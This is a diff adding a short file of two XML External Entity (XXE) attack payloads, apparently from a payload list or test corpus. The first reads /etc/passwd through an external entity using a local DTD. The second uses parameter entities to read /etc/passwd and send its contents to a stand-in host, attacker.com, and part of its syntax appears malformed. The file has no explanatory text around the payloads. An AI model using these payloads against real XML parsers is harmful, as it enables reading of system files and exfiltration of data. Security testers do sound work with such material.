@@ -1,0 +1,23 @@
+<!--?xml version="1.0" ?-->
+<!DOCTYPE message [
+  <!ENTITY % local_dtd SYSTEM "file:///usr/share/yelp/dtd/docbookx.dtd">
+
+  <!ELEMENT t ANY>
+  <!ELEMENT message (#PCDATA)> 
+  <!ENTITY xxe SYSTEM "file:///etc/passwd" >
+%local_dtd;
+]>
+
+<message>135601360123502401401250</message>
+
+
+
+<?xml version="1.0" encoding="ISO-8859-1"?> 
+<!DOCTYPE message [
+  <!ELEMENT message ANY>
+  <!ENTITY % passwd SYSTEM "file:///etc/passwd">
+  <!ENTITY % wrapper "<!ENTITY send SYSTEM 'http://attacker.com/?%passwd;'>">
+  <!ENTITY magic SYSTEM "http://attacker.com/>%passwd;"
+  %wrapper;
+]>
+<message></message>
